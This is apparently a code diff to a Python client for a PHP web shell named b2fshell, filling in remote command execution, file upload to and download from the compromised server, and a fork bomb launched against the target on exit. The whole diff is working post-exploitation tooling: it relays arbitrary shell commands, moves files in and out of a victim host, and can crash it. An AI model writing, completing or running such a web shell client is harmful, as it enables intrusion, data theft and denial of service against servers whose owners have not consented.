@@ -5,6 +5,17 @@ from colorama import Fore, Back, Style
 import requests
 import json
 import base64
+import pathlib
+import datetime
+
+asciifelx="""
+______  _____ ______   _   _            _  _ 
+| ___ \/ __  \|  ___| | | | |          | || |
+| |_/ /`' / /'| |_   / __)| |__    ___ | || |
+| ___ \  / /  |  _|  \__ \| '_ \  / _ \| || |
+| |_/ /./ /___| |    (   /| | | ||  __/| || |
+\____/ \_____/\_|     |_| |_| |_| \___||_||_|
+"""
 
 
 #Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
@@ -13,32 +24,46 @@ import base64
 
 target=""
 fork=False
-CWD=None
+CWD="~"
+host=None
 
 
 class MyPrompt(Cmd):
-    prompt = "#"
-
     def update_prompt(self):
-        global CWD
-        self.promt=CWD+" $ "
+        global CWD,host
+        self.prompt = Fore.GREEN+"b2fsh@"+host+Fore.WHITE+":"+Fore.BLUE+CWD+Fore.WHITE+" $ "+Style.RESET_ALL
 
     def do_upload(self, inp):
-        pass
+        inp=inp.split(" ")
+        if len(inp)>=2:
+            upload(inp[0],inp[1])
+        elif inp[0]:
+            upload(inp[0],inp[0])
+        self.update_prompt()
 
     def default(self, inp):
-        pass
+        shell(inp)
+        self.update_prompt()
         
     def do_exit(self, inp):
+        print("")
         global fork
         if fork:
             forkbomb()
+        
+        timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")
+        log("exited: "+timestamp)
         return True
+
+    do_EOF = do_exit
+
+    def do_foo(self,inp):
+        print(inp)
  
 
 def request(url, params):
     global target
-    return json.loads(requests.post(target+url, data=params))
+    return requests.post(target+url, data=params).json()
 
 def gather_infos(): #every file of file-locations.txt until an empty line occurs
     log("getting most important information:")
@@ -57,19 +82,23 @@ def shell(command):
     if "file" in resp:
         download(resp["name"], resp["file"])
     else:
-        print(resp["stdout"].join("\n"))
+        #print(resp["stdout"])
+        print("\n".join(resp["stdout"]))
         CWD = resp["cwd"]
 
 def download(name,file):
     log("Download To "+name)
-    os.mkdir("download")
-    f=open(name,"w")
+    pathlib.Path("download").mkdir(parents=True, exist_ok=True)
+    f=open("download/"+name,"wb")
     f.write(base64.b64decode(file))
-    pass
+    f.close()
 
-def upload(path):
-    global target
-    pass
+def upload(localname,remotename):
+    f=open(localname,"rb")
+    file=base64.b64encode(f.read())
+    f.close()
+    resp=request("?feature=upload",{"path":remotename,"file":file,"cwd":CWD})
+    print("\n".join(resp["stdout"]))
 
 def forkbomb(): #:(){ :|:& };:
     log("leaving forkbomb")
@@ -85,14 +114,16 @@ def main(target, infos: ('extracts the most important information', 'flag', 'i')
     "Use with b2fshell.php or b2fshell-headless.php"
     globals()['target'] = target
     globals()['fork'] = fork
-
+    globals()['host'] = target.replace("http://","").replace("https://","").split('/')[0]
     if more:
         gather_more()
     elif infos:
         gather_infos()
 
     if not auto:
-        MyPrompt().cmdloop()
+        myp=MyPrompt()
+        myp.update_prompt()
+        myp.cmdloop(intro=asciifelx)
     else:
         warn("--auto specified: terminating")
 if __name__ == '__main__':
